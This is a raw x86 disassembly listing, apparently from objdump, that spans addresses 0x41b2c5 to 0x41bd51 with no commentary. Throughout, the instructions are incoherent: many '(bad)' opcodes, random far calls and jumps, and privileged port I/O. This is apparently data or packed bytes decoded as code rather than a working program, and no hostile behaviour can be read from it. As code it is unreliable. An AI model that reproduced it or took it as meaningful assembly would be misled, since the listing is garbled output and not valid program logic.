  41b2c5:	and    eax,0xf60001
  41b2ca:	add    BYTE PTR [eax],al
  41b2cc:	adc    eax,0x606a670f
  41b2d1:	mov    dh,0x1b
  41b2d3:	cmp    al,0x94
  41b2d5:	jle    0x41b25e
  41b2d7:	sti    
  41b2d8:	pop    edi
  41b2d9:	call   0x6ecd:0x8616cf54
  41b2e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2e1:	imul   edx,DWORD PTR [ebx-0x6],0x3a
  41b2e5:	arpl   cx,bp
  41b2e7:	mov    ah,0xbf
  41b2e9:	sbb    cl,ch
  41b2eb:	push   ds
  41b2ec:	iret   
  41b2ed:	ss push ss
  41b2ef:	ror    BYTE PTR [edx+0x76f40d5d],cl
  41b2f5:	jg     0x41b346
  41b2f7:	dec    eax
  41b2f8:	cmp    dl,ah
  41b2fa:	mov    dh,0xf
  41b2fc:	imul   esi,ebx,0x47d0f0ff
  41b302:	jne    0x41b330
  41b304:	pop    ecx
  41b305:	int    0x9e
  41b307:	push   0x31
  41b309:	fcmovne st,st(7)
  41b30b:	jo     0x41b372
  41b30d:	push   es
  41b30e:	xor    ebx,DWORD PTR [ecx+0xc80e01f]
  41b314:	pop    ds
  41b315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b316:	xor    al,0x60
  41b318:	mov    edi,0xe917e4f6
  41b31d:	aad    0x68
  41b31f:	cmp    BYTE PTR [esi-0xed2315b],cl
  41b325:	fwait
  41b326:	mov    gs,WORD PTR [ebx-0x792eade2]
  41b32c:	push   edi
  41b32d:	sahf   
  41b32e:	iret   
  41b32f:	pop    edx
  41b330:	(bad)  
  41b331:	in     al,0xcd
  41b333:	adc    DWORD PTR [ecx+0x5a48dce],edx
  41b339:	gs ins BYTE PTR es:[di],dx
  41b33c:	add    DWORD PTR [edi+0x56ea73f0],edi
  41b342:	mov    ?,WORD PTR [ecx]
  41b344:	jbe    0x41b331
  41b346:	and    eax,0xebd2a2f9
  41b34b:	dec    edi
  41b34c:	test   edx,0xea21487c
  41b352:	std    
  41b353:	hlt    
  41b354:	mov    ebx,0x299639ba
  41b359:	retf   
  41b35a:	aaa    
  41b35b:	das    
  41b35c:	fst    QWORD PTR [edx-0x24]
  41b360:	(bad)  
  41b361:	aam    0x8e
  41b363:	pop    eax
  41b364:	(bad)  
  41b365:	mov    ch,0x61
  41b367:	mov    cl,0xf6
  41b369:	popf   
  41b36a:	mov    ds,WORD PTR [eax+0x13]
  41b36d:	daa    
  41b36e:	cwde   
  41b36f:	lahf   
  41b370:	inc    edx
  41b371:	and    ah,BYTE PTR [ebp-0x46]
  41b374:	push   edx
  41b375:	mov    eax,DWORD PTR [ebx+esi*8+0x51f52b5b]
  41b37c:	mov    ds:0x1ed7ad32,eax
  41b381:	fwait
  41b382:	sti    
  41b383:	retf   
  41b384:	jp     0x41b3f6
  41b386:	test   eax,0x7d4d2010
  41b38b:	out    0x83,al
  41b38d:	mov    WORD PTR [edi],?
  41b38f:	mov    ds:0xb46e3f05,eax
  41b394:	mov    al,0x3d
  41b396:	lods   eax,DWORD PTR ds:[esi]
  41b397:	push   es
  41b398:	cmp    dh,BYTE PTR [eax-0x3ee83a1]
  41b39e:	and    al,0x8d
  41b3a0:	out    0xea,al
  41b3a2:	jno    0x41b402
  41b3a4:	pop    es
  41b3a5:	ja     0x41b34c
  41b3a7:	and    edi,DWORD PTR [esi+0x7cf5dcf]
  41b3ad:	adc    eax,0xbf6b1ad3
  41b3b2:	pushf  
  41b3b3:	dec    ebx
  41b3b4:	dec    esi
  41b3b5:	mov    eax,0xd8b4a086
  41b3ba:	aaa    
  41b3bb:	sub    dh,BYTE PTR [eax]
  41b3bd:	cmp    cl,BYTE PTR [edx+0x5e5934]
	...
  41b433:	add    BYTE PTR [edi-0xf0307e],bh
  41b439:	dec    edi
  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	sub    DWORD PTR ds:0x26e4ae1e,edx
  41b446:	add    DWORD PTR [eax],eax
  41b448:	test   BYTE PTR [eax],0x0
  41b44b:	add    BYTE PTR [edi],ah
  41b44d:	pop    ds
  41b44e:	dec    ecx
  41b44f:	push   ebp
  41b450:	pop    es
  41b451:	out    dx,al
  41b452:	adc    BYTE PTR [esi],dh
  41b454:	(bad)  
  41b455:	adc    bh,BYTE PTR [edi]
  41b457:	int3   
  41b458:	mov    DWORD PTR [esi+0x2ec807e0],0x576f9b9f
  41b462:	test   eax,0xcdd96c84
  41b467:	clc    
  41b468:	mov    ah,0xc1
  41b46a:	cmc    
  41b46b:	(bad)  
  41b46c:	fucom  st(0)
  41b46e:	idiv   BYTE PTR [esi-0x4ccf85da]
  41b474:	dec    ebp
  41b475:	jo     0x41b46a
  41b477:	pop    ss
  41b478:	cmc    
  41b479:	pop    ebp
  41b47a:	test   DWORD PTR [edi-0x62],eax
  41b47d:	mov    bh,0x85
  41b47f:	fisub  DWORD PTR [eax-0x3e]
  41b482:	mov    BYTE PTR [ebx+0x726eeda0],cl
  41b488:	cs mov cl,0xd3
  41b48b:	inc    ebx
  41b48c:	pop    ss
  41b48d:	scas   al,BYTE PTR es:[edi]
  41b48e:	jecxz  0x41b49f
  41b490:	pop    ecx
  41b491:	ret    
  41b492:	pop    eax
  41b493:	dec    eax
  41b494:	stos   DWORD PTR es:[edi],eax
  41b495:	cmp    al,0x0
  41b497:	daa    
  41b498:	xchg   edx,eax
  41b499:	scas   eax,DWORD PTR es:[edi]
  41b49a:	sar    BYTE PTR [edx+0x6f],cl
  41b49d:	or     BYTE PTR [edi+ebx*4-0x56b4e612],0x78
  41b4a5:	jmp    0x4eaa165c
  41b4aa:	lods   eax,DWORD PTR ds:[esi]
  41b4ab:	dec    esp
  41b4ac:	jb     0x41b47e
  41b4ae:	xor    edx,DWORD PTR [edi-0x2871ec33]
  41b4b4:	ss cmp eax,edx
  41b4b7:	sub    ah,dh
  41b4b9:	(bad)  
  41b4bb:	test   eax,0xb0af19f1
  41b4c0:	fucomp st(4)
  41b4c2:	sub    edi,DWORD PTR [ebx+0x4da5ad24]
  41b4c8:	in     eax,dx
  41b4c9:	cmc    
  41b4ca:	jae    0x41b507
  41b4cc:	ds je  0x41b4fa
  41b4cf:	mov    fs,WORD PTR [esi]
  41b4d1:	or     al,0x14
  41b4d3:	push   esp
  41b4d4:	fnstcw WORD PTR [ecx+0x5dac6f16]
  41b4da:	xchg   cl,cl
  41b4dc:	inc    esp
  41b4dd:	or     cl,BYTE PTR [ebx-0x58543dfe]
  41b4e3:	aad    0x4d
  41b4e5:	dec    eax
  41b4e6:	sbb    eax,0x555ed05c
  41b4eb:	fsub   st(7),st
  41b4ed:	mov    esi,0xc40b7350
  41b4f2:	inc    ecx
  41b4f3:	push   cs
  41b4f4:	or     al,0x65
  41b4f6:	mov    ecx,es
  41b4f8:	sub    eax,0xb93be85a
  41b4fd:	cmp    eax,DWORD PTR [ecx-0x60dd8a50]
  41b503:	rcl    DWORD PTR [ecx*1+0x754f30d4],cl
  41b50a:	nop
  41b50b:	jae    0x41b4a8
  41b50d:	ror    BYTE PTR [esi+esi*2],cl
  41b510:	xlat   BYTE PTR ds:[ebx]
  41b511:	inc    edx
  41b512:	mov    bh,0x37
  41b514:	and    DWORD PTR [edi+0x3c],0xfffffff7
  41b518:	not    BYTE PTR [ebp+0x6aa16bd1]
  41b51e:	or     eax,0x34ff76a6
  41b523:	sbb    esp,ecx
  41b525:	lods   eax,DWORD PTR ds:[esi]
  41b526:	push   ebx
  41b527:	pop    eax
  41b528:	mov    eax,ds:0xbd118e23
  41b52d:	loope  0x41b4c3
  41b52f:	(bad)  
  41b530:	fistp  QWORD PTR [eax+0x40]
  41b533:	fsub   DWORD PTR [edx]
  41b535:	out    0x91,eax
  41b537:	std    
  41b538:	ds ret 
  41b53a:	or     edi,eax
  41b53c:	xor    DWORD PTR [ebp+eiz*4-0x21],esi
  41b540:	hlt    
  41b541:	jl     0x41b543
	...
  41b5b3:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0x43
  41b5c1:	cmp    DWORD PTR [ebp+0x127da7f],ebx
  41b5c7:	add    dh,dh
  41b5c9:	add    BYTE PTR [eax],al
  41b5cb:	add    BYTE PTR [eax-0x3ce2599f],dl
  41b5d1:	call   0xdce2:0xdf45bdf9
  41b5d8:	(bad)  
  41b5d9:	out    0x1b,eax
  41b5db:	mov    dh,0xb
  41b5dd:	mov    eax,0x653dc2ac
  41b5e2:	mov    dh,BYTE PTR [ebx-0x48a0cbdd]
  41b5e8:	aaa    
  41b5e9:	popa   
  41b5ea:	mov    ebp,0x3310e3cf
  41b5ef:	sub    esp,ebx
  41b5f1:	dec    esi
  41b5f2:	jecxz  0x41b59b
  41b5f4:	adc    ebx,edx
  41b5f6:	pop    eax
  41b5f7:	inc    edi
  41b5f8:	push   esi
  41b5f9:	jmp    0x8bcf:0x3fce3a9
  41b600:	out    dx,al
  41b601:	pop    es
  41b602:	jmp    DWORD PTR [eax]
  41b604:	stos   BYTE PTR es:[edi],al
  41b605:	test   ebx,0xe07f9f17
  41b60b:	hlt    
  41b60c:	mov    bh,0x33
  41b60e:	outs   dx,DWORD PTR ds:[esi]
  41b60f:	ret    0x6daf
  41b612:	push   esp
  41b613:	push   esp
  41b614:	(bad)  
  41b615:	cmp    eax,0x5a8df924
  41b61a:	ss mov ebx,0xe098afce
  41b620:	dec    esi
  41b621:	dec    esi
  41b622:	mov    ds:0x1e50cd27,al
  41b627:	in     al,0x6f
  41b629:	push   es
  41b62a:	jmp    0xdd81:0x9fc2d0bb
  41b631:	iret   
  41b632:	cmp    BYTE PTR [esp+eax*4+0x72aad134],cl
  41b639:	in     eax,0x54
  41b63b:	pop    esp
  41b63c:	das    
  41b63d:	iret   
  41b63e:	pusha  
  41b63f:	mov    dl,0x58
  41b641:	and    bl,0x88
  41b644:	aas    
  41b645:	mov    ecx,0xb67ca51a
  41b64a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b64b:	push   esi
  41b64c:	push   esi
  41b64d:	or     DWORD PTR [bp+si],edx
  41b650:	mov    ds:0xa97c9144,al
  41b655:	pop    ebp
  41b656:	jle    0x41b62a
  41b658:	mov    DWORD PTR [edi+ecx*2],0xd028611b
  41b65f:	push   esi
  41b660:	iret   
  41b661:	arpl   WORD PTR [ebx],cx
  41b663:	sbb    DWORD PTR [edi+0x8d5d11e],ebx
  41b669:	pop    esi
  41b66a:	imul   esi,DWORD PTR [edi+0x71],0x75d17ec1
  41b671:	xchg   edx,eax
  41b672:	popa   
  41b673:	ins    DWORD PTR es:[edi],dx
  41b674:	push   ds
  41b675:	push   0x5c
  41b677:	shl    ebx,cl
  41b679:	push   ecx
  41b67a:	and    edx,ebx
  41b67c:	repnz loopne 0x41b65e
  41b67f:	popa   
  41b680:	cmp    bl,BYTE PTR [ebp-0x7c3211e]
  41b686:	call   FWORD PTR [ecx]
  41b688:	fwait
  41b689:	popf   
  41b68a:	jae    0x41b6bd
  41b68c:	push   eax
  41b68d:	pop    eax
  41b68e:	lahf   
  41b68f:	sbb    eax,0x555e5353
  41b694:	sbb    bh,BYTE PTR [edi-0x56f12bb8]
  41b69a:	inc    eax
  41b69b:	xor    al,0xbb
  41b69d:	pop    ecx
  41b69e:	and    DWORD PTR [edx+edx*2],edi
  41b6a1:	mov    bl,0xf7
  41b6a3:	and    cl,dl
  41b6a5:	loopne 0x41b67e
  41b6a7:	push   ecx
  41b6a8:	shr    ebx,cl
  41b6aa:	cdq    
  41b6ab:	lea    ebx,[ebx]
  41b6ad:	mov    ebp,0xfa4142d0
  41b6b2:	jae    0x41b694
  41b6b4:	dec    eax
  41b6b5:	pop    eax
  41b6b6:	jl     0x41b6c9
  41b6b8:	aam    0x9e
  41b6ba:	push   ebx
  41b6bb:	mov    bl,dh
  41b6bd:	out    0xe7,al
  41b6bf:	cmp    eax,0x978d
	...
  41b734:	repz xchg edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    BYTE PTR [ecx+esi*2],dl
  41b742:	inc    edi
  41b743:	test   eax,edx
  41b745:	sub    BYTE PTR [ecx],al
  41b747:	add    dh,dh
  41b749:	add    BYTE PTR [eax],al
  41b74b:	add    BYTE PTR [edx],ch
  41b74d:	imul   ecx,DWORD PTR [ebp-0x56],0x35a6a758
  41b754:	jno    0x41b741
  41b756:	test   BYTE PTR [eax],bh
  41b758:	sub    eax,0xcffc1d86
  41b75d:	ins    BYTE PTR es:[edi],dx
  41b75e:	lock out 0x2d,eax
  41b761:	es leave 
  41b763:	mov    edx,0xd299a015
  41b768:	or     edi,DWORD PTR [eax+0x108f2a97]
  41b76e:	jl     0x41b7c7
  41b770:	mov    cl,0x20
  41b772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b773:	pop    es
  41b774:	inc    eax
  41b775:	out    0x8b,al
  41b777:	int3   
  41b778:	mov    esp,0x3bf4db1
  41b77d:	sbb    DWORD PTR [ebp-0x20],eax
  41b780:	xchg   ebp,eax
  41b781:	mov    eax,ds:0x6dab257d
  41b786:	jb     0x41b749
  41b788:	retf   
  41b789:	xchg   edi,eax
  41b78a:	push   eax
  41b78b:	jg     0x41b7c2
  41b78d:	xor    cl,BYTE PTR [ecx]
  41b78f:	xchg   ebx,eax
  41b790:	jno    0x41b733
  41b792:	and    DWORD PTR [ebx+eiz*4],ecx
  41b795:	jns    0x41b796
  41b797:	jl     0x41b80f
  41b799:	lods   eax,DWORD PTR ds:[esi]
  41b79a:	sub    ebp,DWORD PTR [esi+0x77]
  41b79d:	sbb    eax,0x47e8f31c
  41b7a2:	mov    eax,DWORD PTR [edi+0x12]
  41b7a5:	push   ds
  41b7a6:	outs   dx,WORD PTR ds:[esi]
  41b7a8:	into   
  41b7a9:	cld    
  41b7aa:	xchg   ebx,eax
  41b7ab:	and    ebp,DWORD PTR [esi-0x7e]
  41b7ae:	pop    eax
  41b7af:	cmp    BYTE PTR [edi],0x1e
  41b7b2:	dec    DWORD PTR [edx-0xcc92bec]
  41b7b8:	mov    edx,0x2e1f76b
  41b7bd:	(bad)  
  41b7be:	jmp    DWORD PTR [ebx-0x8]
  41b7c1:	jmp    0x22eb:0xc74ed584
  41b7c8:	stos   BYTE PTR es:[edi],al
  41b7c9:	addr16 and eax,0x35d34dad
  41b7cf:	test   DWORD PTR [edx+0x69],ebp
  41b7d2:	and    eax,0x9ee775ec
  41b7d7:	sub    al,0xaa
  41b7d9:	imul   edx,DWORD PTR [ebx+0xb],0x40
  41b7dd:	fdivr  st,st(6)
  41b7df:	cmp    ah,BYTE PTR fs:[edi+eiz*1+0x20]
  41b7e4:	test   eax,0x74d7814d
  41b7e9:	popf   
  41b7ea:	sub    BYTE PTR [ebx],ch
  41b7ec:	push   esp
  41b7ed:	xchg   ecx,eax
  41b7ee:	gs dec esi
  41b7f0:	aaa    
  41b7f1:	sub    BYTE PTR ds:[ebx],0x61
  41b7f5:	jge    0x41b7e3
  41b7f7:	adc    DWORD PTR [ecx-0x26],esi
  41b7fa:	mov    dl,0xd2
  41b7fc:	mov    ch,dh
  41b7fe:	pop    es
  41b7ff:	jmp    0x41b85c
  41b801:	sbb    esi,DWORD PTR [ebx+0x396846bd]
  41b807:	sbb    ah,BYTE PTR gs:[ecx]
  41b80a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b80b:	cs jmp 0xc6dbf7ce
  41b811:	fbld   TBYTE PTR [esi+edi*1]
  41b814:	pop    esi
  41b815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b816:	stc    
  41b817:	and    eax,0x7035c813
  41b81c:	shl    DWORD PTR [edx],1
  41b81e:	push   edx
  41b81f:	sbb    ebp,edx
  41b821:	add    ecx,DWORD PTR [edx-0x52]
  41b824:	pop    es
  41b825:	mov    esp,0x53eec335
  41b82a:	ret    
  41b82b:	clc    
  41b82c:	in     al,dx
  41b82d:	jl     0x41b87b
  41b82f:	in     al,0x59
  41b831:	loope  0x41b82b
  41b833:	fcom   DWORD PTR [esi-0x3b]
  41b836:	fcos   
  41b838:	inc    edi
  41b839:	adc    bl,BYTE PTR [eax-0x7c]
  41b83c:	std    
  41b83d:	pop    edx
  41b83e:	or     dh,BYTE PTR [edi+0xb]
  41b841:	out    0x0,al
	...
  41b8b3:	add    BYTE PTR ds:0xcf4a867e,dh
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	std    
  41b8c1:	and    al,0x62
  41b8c3:	test   dh,0x29
  41b8c6:	add    DWORD PTR [eax],eax
  41b8c8:	test   BYTE PTR [eax],0x0
  41b8cb:	add    BYTE PTR [edx+0x74],dh
  41b8ce:	xchg   edx,eax
  41b8cf:	ret    
  41b8d0:	fbld   TBYTE PTR [ecx]
  41b8d2:	and    edi,DWORD PTR [ebp+0x3c6f4e50]
  41b8d8:	fld    QWORD PTR [esi-0x1f]
  41b8db:	jl     0x41b869
  41b8dd:	lods   al,BYTE PTR ds:[esi]
  41b8de:	mov    al,ds:0xa54d45dd
  41b8e3:	mov    esp,0xa98e6893
  41b8e8:	and    esp,DWORD PTR [edx+0x7a]
  41b8eb:	and    eax,0xcd76763f
  41b8f0:	sar    ah,cl
  41b8f2:	test   al,0xf5
  41b8f4:	push   ecx
  41b8f5:	shr    DWORD PTR ds:0xe93c37ce,1
  41b8fb:	push   edi
  41b8fc:	lods   al,BYTE PTR ds:[esi]
  41b8fd:	xchg   edx,eax
  41b8fe:	std    
  41b8ff:	cmp    BYTE PTR [ebx-0x2c6f27d2],dl
  41b905:	(bad)  
  41b907:	bound  eax,QWORD PTR [edx+0x2d]
  41b90a:	dec    esp
  41b90b:	mov    ebx,0x484ecff
  41b910:	inc    edx
  41b911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b912:	xchg   edx,eax
  41b913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b914:	iret   
  41b915:	fist   DWORD PTR [edx+0x4]
  41b918:	push   ebx
  41b919:	xor    al,BYTE PTR [esi+eax*1]
  41b91c:	mov    edi,0x506f3bdb
  41b921:	(bad)  
  41b922:	add    eax,0x37f67b94
  41b927:	jge    0x41b900
  41b929:	scas   al,BYTE PTR es:[edi]
  41b92a:	stos   BYTE PTR es:[edi],al
  41b92b:	repnz xchg edx,eax
  41b92d:	cmc    
  41b92e:	inc    eax
  41b92f:	xor    ecx,DWORD PTR [ebp-0x779fb015]
  41b935:	mov    dl,0x21
  41b937:	icebp  
  41b938:	jae    0x41b94b
  41b93a:	xchg   ecx,eax
  41b93b:	data16 ror BYTE PTR [eax],0x88
  41b93f:	mov    esp,0x501ec36c
  41b944:	xor    ebx,DWORD PTR [edx-0x1b]
  41b947:	add    eax,0xab9cacd2
  41b94c:	mov    eax,0x2794c86e
  41b951:	mov    eax,0x3eebea9d
  41b956:	out    dx,eax
  41b957:	xor    ecx,DWORD PTR [esi-0x47]
  41b95a:	pop    edi
  41b95b:	dec    eax
  41b95c:	mov    ds:0xbae21c69,eax
  41b961:	stc    
  41b962:	cdq    
  41b963:	das    
  41b964:	sti    
  41b965:	pop    edi
  41b966:	pop    edi
  41b967:	cmp    BYTE PTR [eax+0x46],0xad
  41b96b:	dec    edi
  41b96c:	fmul   QWORD PTR [edi+0x6e]
  41b96f:	(bad)  [eax-0x7861b594]
  41b975:	mov    ecx,0x6350c549
  41b97a:	push   ebx
  41b97b:	arpl   WORD PTR [eax-0x12],di
  41b97e:	call   0x637:0x796d266c
  41b985:	(bad)
  41b988:	add    al,0xfc
  41b98a:	pop    ecx
  41b98b:	rol    al,1
  41b98d:	clc    
  41b98e:	cmp    al,0x78
  41b990:	xor    al,0x57
  41b992:	sub    BYTE PTR [edx-0x25abeea0],0x49
  41b999:	in     al,0x30
  41b99b:	in     al,0x27
  41b99d:	mov    al,0x96
  41b99f:	popf   
  41b9a0:	jl     0x41b964
  41b9a2:	jno    0x41b9fb
  41b9a4:	xor    eax,0xbcc114d7
  41b9a9:	mov    ebp,0xca6136b2
  41b9ae:	xchg   BYTE PTR ds:0x4bf303ef,ah
  41b9b4:	test   DWORD PTR [esi-0x39797f67],edi
  41b9ba:	pop    edi
  41b9bb:	push   esi
  41b9bc:	jl     0x41b963
  41b9be:	and    ah,BYTE PTR [eax+0x32]
  41b9c1:	xchg   edx,eax
	...
  41ba32:	add    BYTE PTR [eax],al
  41ba34:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	cwde   
  41ba41:	xor    DWORD PTR [eax-0x6a],edi
  41ba44:	mov    esp,0xf600012a
  41ba49:	add    BYTE PTR [eax],al
  41ba4b:	add    BYTE PTR [edx],bh
  41ba4d:	inc    ebx
  41ba4e:	out    0x94,eax
  41ba50:	add    eax,0x5f8b6f
  41ba55:	stos   DWORD PTR es:[edi],eax
  41ba56:	loop   0x41ba9e
  41ba58:	dec    esi
  41ba59:	jo     0x41ba2f
  41ba5b:	(bad)  
  41ba5c:	aam    0x2c
  41ba5e:	sub    BYTE PTR [ecx+0x60],dh
  41ba61:	pop    esi
  41ba62:	mov    ds:0x9bdfa638,eax
  41ba67:	mov    cl,0xb3
  41ba69:	mov    al,0x18
  41ba6b:	leave  
  41ba6c:	mov    edx,0xdc9758c9
  41ba71:	icebp  
  41ba72:	fwait
  41ba73:	pop    es
  41ba74:	add    eax,0xa0ab4c67
  41ba79:	jl     0x41ba88
  41ba7b:	and    eax,0x867e731a
  41ba80:	sub    eax,0x629ab4bc
  41ba85:	dec    eax
  41ba86:	in     al,0x4f
  41ba88:	add    eax,0x6dde10f
  41ba8d:	arpl   WORD PTR [eax-0x58],dx
  41ba90:	fstp   QWORD PTR [esi-0x4b0ac5a2]
  41ba96:	mov    bh,0xb5
  41ba98:	push   esi
  41ba99:	xor    dl,ch
  41ba9b:	pop    ebp
  41ba9c:	add    ebp,edi
  41ba9e:	xor    al,0x9a
  41baa0:	shl    DWORD PTR [eax],0x5c
  41baa3:	xchg   ecx,eax
  41baa4:	ja     0x41ba58
  41baa6:	sbb    DWORD PTR [edx+0x62616a18],eax
  41baac:	or     ebp,ebx
  41baae:	outs   dx,BYTE PTR ds:[esi]
  41baaf:	psrlw  mm1,QWORD PTR [esi+0x396cc8e2]
  41bab6:	add    DWORD PTR ds:0x23a75ead,ebp
  41babc:	test   eax,0x3baa633b
  41bac1:	loopne 0x41baed
  41bac3:	push   edi
  41bac4:	jbe    0x41bb29
  41bac6:	lds    esp,FWORD PTR [eax-0xe8a97b6]
  41bacc:	fidiv  WORD PTR [esi]
  41bace:	enter  0x4d49,0xd1
  41bad2:	mov    al,0x66
  41bad4:	(bad)  
  41bad5:	cmp    al,dh
  41bad7:	rol    BYTE PTR [esi-0xb],1
  41bada:	popf   
  41badb:	ret    
  41badc:	out    dx,eax
  41badd:	ins    DWORD PTR es:[edi],dx
  41bade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41badf:	das    
  41bae0:	add    dh,BYTE PTR [esi+0x5b]
  41bae3:	cdq    
  41bae4:	push   eax
  41bae5:	xor    ebp,eax
  41bae7:	sub    dl,bh
  41bae9:	push   edi
  41baea:	xor    DWORD PTR [esi-0xab0a996],0xca9539ab
  41baf4:	lods   eax,DWORD PTR ds:[esi]
  41baf5:	sub    cl,BYTE PTR [ebp-0x5a258f93]
  41bafb:	nop
  41bafc:	(bad)  
  41bafd:	(bad)  
  41baff:	pop    ecx
  41bb00:	push   edx
  41bb01:	jbe    0x41ba83
  41bb03:	sbb    dh,ch
  41bb05:	xor    al,dh
  41bb07:	int    0x25
  41bb09:	sbb    eax,0xf2459f65
  41bb0e:	ror    BYTE PTR [edi-0x181ed6b5],1
  41bb14:	mov    DWORD PTR ds:0x535cc1cf,edx
  41bb1a:	fbld   TBYTE PTR [ebx+0x765b17db]
  41bb20:	jno    0x41bb3c
  41bb22:	xchg   ebp,eax
  41bb23:	xchg   edi,eax
  41bb24:	arpl   WORD PTR [ecx+0x488a0b93],bp
  41bb2a:	cmp    BYTE PTR [ecx+edx*2+0x1f],0xde
  41bb2f:	mov    al,ds:0x32c977c2
  41bb34:	sub    DWORD PTR [ecx+0x44],eax
  41bb37:	cmp    eax,DWORD PTR [ecx+0x2ceb02fe]
  41bb3d:	mov    esi,0xa298dec1
	...
  41bbb2:	add    BYTE PTR [eax],al
  41bbb4:	push   0x49
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	jno    0x41bbc2
  41bbc2:	(bad)  
  41bbc3:	clc    
  41bbc4:	mov    dl,0x2b
  41bbc6:	add    DWORD PTR [eax],eax
  41bbc8:	test   BYTE PTR [eax],0x0
  41bbcb:	add    BYTE PTR [eax+0x7e1c8640],bl
  41bbd1:	mov    al,ds:0xf4e5f6d7
  41bbd6:	outs   dx,BYTE PTR ds:[esi]
  41bbd7:	hlt    
  41bbd8:	mov    dl,0xec
  41bbda:	mov    eax,ds:0xefaf5258
  41bbdf:	ds stos DWORD PTR es:[edi],eax
  41bbe1:	je     0x41bbe9
  41bbe3:	(bad)  
  41bbe4:	sbb    al,0x80
  41bbe6:	and    DWORD PTR [esi],esp
  41bbe8:	std    
  41bbe9:	jmp    0x7a47:0xd9b863c8
  41bbf0:	push   ecx
  41bbf1:	mov    esp,0x8f5f0b4d
  41bbf6:	imul   ebp,DWORD PTR [edx],0xffffffe7
  41bbf9:	jmp    0x909:0x34bddb20
  41bc00:	mov    ebx,0xc4709d17
  41bc05:	pop    DWORD PTR [esp+ecx*2-0x55]
  41bc09:	jae    0x41bb94
  41bc0b:	das    
  41bc0c:	outs   dx,BYTE PTR ds:[esi]
  41bc0d:	loopne 0x41bc64
  41bc0f:	push   ds
  41bc10:	pop    esp
  41bc11:	mov    esi,0x6151c7b2
  41bc16:	pop    ss
  41bc17:	push   ecx
  41bc18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc19:	sbb    BYTE PTR [edi-0x315c8e8f],dh
  41bc1f:	jae    0x41bc27
  41bc21:	pop    ebx
  41bc22:	inc    ebx
  41bc23:	clc    
  41bc24:	push   ss
  41bc25:	movd   mm1,DWORD PTR [esp+ecx*2+0x3d]
  41bc2a:	in     al,dx
  41bc2b:	int3   
  41bc2c:	inc    ebp
  41bc2d:	pop    ss
  41bc2e:	xor    eax,ecx
  41bc30:	(bad)  
  41bc31:	iret   
  41bc32:	repnz fisub DWORD PTR [esp+esi*2+0x67]
  41bc37:	pop    edi
  41bc38:	lods   al,BYTE PTR ds:[esi]
  41bc39:	shl    BYTE PTR [ecx+0x6a],cl
  41bc3c:	mov    dl,0xb
  41bc3e:	loopne 0x41bca2
  41bc40:	popa   
  41bc41:	mov    DWORD PTR [ebx-0x3908efac],esp
  41bc47:	mov    ?,ecx
  41bc49:	mov    ch,0x4d
  41bc4b:	add    BYTE PTR [esp+ecx*4-0x62],dl
  41bc4f:	pop    es
  41bc50:	in     eax,0x90
  41bc52:	ret    0xe866
  41bc55:	mov    ds:0x6bd88cc8,eax
  41bc5a:	xchg   eax,edi
  41bc5c:	jmp    0xd69c1e63
  41bc61:	imul   esi,esp,0xfffffffd
  41bc64:	push   edx
  41bc65:	ss int 0x7b
  41bc68:	and    al,0xc6
  41bc6a:	rcr    DWORD PTR [ecx-0x5f],1
  41bc6d:	in     eax,dx
  41bc6e:	lock mov WORD PTR [esi-0x3],fs
  41bc72:	in     al,0x20
  41bc74:	push   esi
  41bc75:	mov    ebx,0xb354722a
  41bc7a:	adc    ecx,DWORD PTR [edx+0x2b]
  41bc7d:	mov    ds,WORD PTR [ebp-0x2a]
  41bc80:	frstor [eax+0x35e108cc]
  41bc86:	cwde   
  41bc87:	push   eax
  41bc88:	inc    ecx
  41bc89:	xor    DWORD PTR [edx-0x66488ce],esp
  41bc8f:	xor    eax,0x985192f3
  41bc94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc95:	jg     0x41bc8c
  41bc97:	int    0x73
  41bc99:	mov    dl,0x11
  41bc9b:	push   0xffffffde
  41bc9d:	or     DWORD PTR [eax+0x3d81b1d4],ebp
  41bca3:	jg     0x41bc25
  41bca5:	outs   dx,BYTE PTR ds:[esi]
  41bca6:	add    bh,dh
  41bca8:	push   es
  41bca9:	cdq    
  41bcaa:	cs dec edx
  41bcac:	jle    0x41bc5a
  41bcae:	lea    esi,[ebp+0x61]
  41bcb1:	cld    
  41bcb2:	imul   eax,DWORD PTR [ebp+0x3b],0xed37cd4f
  41bcb9:	sbb    ebp,ebp
  41bcbb:	dec    eax
  41bcbc:	loop   0x41bd2a
  41bcbe:	cmp    esp,DWORD PTR [ebp+0x32]
  41bcc1:	xor    DWORD PTR [eax],eax
	...
  41bd33:	add    BYTE PTR [ebp-0x8],dl
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0x82bf1c9a
  41bd41:	sahf   
  41bd42:	mov    DWORD PTR [eax+0x12ca8],ebx
  41bd48:	test   BYTE PTR [eax],0x0
  41bd4b:	add    BYTE PTR [edx+0x6bb3831f],dh
  41bd51:	aad    0x7c
